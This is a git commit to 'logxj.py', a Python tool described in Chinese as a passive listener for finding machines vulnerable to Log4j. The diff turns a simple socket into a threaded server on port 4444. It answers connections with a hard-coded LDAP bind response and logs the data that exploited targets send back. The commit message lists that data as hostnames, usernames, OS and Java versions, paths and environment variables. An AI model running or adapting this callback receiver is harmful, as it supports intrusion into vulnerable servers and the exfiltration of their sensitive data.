0e70887610ae375290821373340d0fdd8de6b292
xcanwin <xcanwin@gmail.com>
2022-01-18 05:48:52 +0800

    - 监听端口, 等待猎物，被动式发现存在Log4j漏洞的机器. - 最大化了POC的威力: 可以获取目前机器的系统时间、主机名、Log4j路径、系统版本号、java版本号、系统用户名、中间件信息（含物理路径）、环境变量等敏感信息. - 功能超越了dnslog和ncat. - 时刻监听同一端口, 可不限制地接收多个目标传输过来的漏洞信息. - 收到漏洞信息后立即断开, 避免占用目标的程序线程和网络连接. - 记录历史, 保存漏洞信息.

--- logxj.py
+++ logxj.py
@@ -1,11 +1,32 @@
-import socket
-port = 61359
-print('WAITING...')
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-sock.bind(('0.0.0.0',port))
-sock.listen(1)
-connection,address = sock.accept()
-print('LOGXJ:')
-print(connection.recv(1024).decode('utf-8','ignore'))
-connection.close()
+import socket, threading, binascii
+
+server_host = '0.0.0.0'
+server_port = 4444
+
+def listen(server_host, server_port):
+    print('LOGXJ: Listening on %s:%s' % (server_host, server_port))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((server_host, server_port))
+    sock.listen(5)
+    while True:
+        connection, (client_host, client_port) = sock.accept()
+        result_from = '\n\nLOGXJ: Connection from %s:%s\n' % (client_host, client_port)
+        result = result_from.encode()
+        get_data1 = connection.recv(1024*100)
+        connection.send(binascii.a2b_hex('300c02010161070a010004000400'))
+        get_data2 = connection.recv(1024*100)
+        get_data2 = get_data2[get_data2.find(b'Found'):get_data2.find(b'End')]
+        result += get_data2 + b'\n'
+        print(result.decode('utf-8', 'ignore'))
+        open('logxj.log', 'ab').write(result)
+        connection.close()
+
+t = threading.Thread(target=listen, args=(server_host, server_port))
+t.daemon = True
+t.start()
+try:
+    while True:
+        pass
+except:
+    exit('LOGXJ: Exit')
